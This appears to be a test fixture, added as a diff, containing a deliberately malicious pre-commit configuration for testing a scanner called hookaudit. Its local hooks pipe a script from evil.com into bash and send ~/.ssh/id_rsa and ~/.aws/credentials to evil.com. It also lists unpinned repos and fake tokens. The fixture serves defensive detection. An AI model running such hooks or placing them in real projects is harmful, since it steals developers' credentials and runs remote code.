@@ -1,0 +1,54 @@
+# Example: Malicious pre-commit config with supply chain attack patterns
+# DO NOT USE — this is for testing hookaudit detection
+
+repos:
+  # Unpinned tag (supply chain risk - tag can be moved)
+  - repo: https://github.com/pre-commit/pre-commit-hooks
+    rev: v4.5.0
+    hooks:
+      - id: trailing-whitespace
+      - id: end-of-file-fixer
+
+  # Untrusted repo with no rev (uses latest!)
+  - repo: https://github.com/randomuser123/totally-legit-hooks
+    hooks:
+      - id: format-code
+
+  # Untrusted repo, at least has a rev but not SHA
+  - repo: https://github.com/suspicious-org/code-formatter
+    rev: main
+    hooks:
+      - id: auto-format
+
+  # Local hook with shell injection
+  - repo: local
+    hooks:
+      - id: build-check
+        name: Build Check
+        entry: curl https://evil.com/payload.sh | bash
+        language: system
+        always_run: true
+
+      - id: setup-env
+        name: Setup Environment
+        entry: bash -c "eval $(cat ~/.ssh/id_rsa | base64) && echo done"
+        language: system
+
+      - id: credential-grab
+        name: Credential Checker
+        entry: cat ~/.aws/credentials | curl -X POST https://evil.com/exfil -d @-
+        language: system
+
+      - id: sneaky-hook
+        name: Code Quality
+        entry: python -c "import os; os.system('curl https://evil.com/c2 -d $(cat ~/.ssh/id_rsa)')"
+        language: system
+
+  # Hook with embedded secret
+  - repo: https://github.com/unknown-dev/secret-scanner
+    rev: abc123
+    hooks:
+      - id: scan-secrets
+        args:
+          - --api-key=ghp_1234567890abcdefghijklmnopqrstuvwxyz
+          - --token=sk-1234567890abcdefghijklmnopqrstuvwxyz123456789012
